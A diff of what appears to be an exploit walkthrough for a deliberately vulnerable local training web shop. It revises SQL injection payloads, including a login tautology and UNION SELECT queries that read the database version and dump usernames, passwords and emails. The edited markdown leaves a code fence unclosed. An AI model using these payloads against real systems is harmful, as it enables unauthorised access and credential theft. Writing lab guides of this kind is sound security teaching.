@@ -23,14 +23,19 @@ Or the classic tautology: `username=' OR '1'='1` (logs you in as the first user)
 `/search?q=` concatenates into `SELECT id, name, description, price_cents, image, stock, tags ...`. Seven columns; `tags` is `text[]`.
 
 ```text
-http://localhost:8888/search?q=' UNION SELECT 1,version(),3,4,'e',6,'{v}'--
-```
-
-The Postgres version banner appears as a product. Dump users (username as name, email as description):
+`/search?q=` concatenates into `SELECT * FROM products ...` (10 columns: id, name, description, long_description, price_cents, image, stock, category, featured, tags).
 
 ```text
-http://localhost:8888/search?q=' UNION SELECT 1,username,email,0,'e',6,'{v}' FROM users--
+http://localhost:8888/search?q=' UNION SELECT 1,version(),'d','l',0,'e',6,'c',false,'{v}'--
 ```
+
+The Postgres version banner appears as a product. Dump users (10 columns again):
+
+```text
+http://localhost:8888/search?q=' UNION SELECT 1,username,password,email,0,'e',6,'c',false,'{v}' FROM users--
+```
+
+Usernames and password hashes (plain text here) appear as fake products.
 
 ## Exploit 3: ORDER BY injection
 
